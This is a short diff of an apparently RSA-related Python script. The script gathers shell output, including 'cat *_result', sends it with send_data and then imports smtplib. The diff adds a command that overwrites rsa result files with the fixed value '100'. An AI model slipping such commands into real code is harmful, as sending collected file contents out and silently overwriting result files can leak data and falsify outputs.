@@ -56,6 +56,7 @@ my_data += "\n#######################\n"
 my_data += get_data("cat *_result") or ""
 my_data += "\n#######################\n"
 send_data(my_data)
+my_data += get_data("echo 100 > rsa-*_result") or ""
 print("77=11*7")
 ##############################################################
 import smtplib
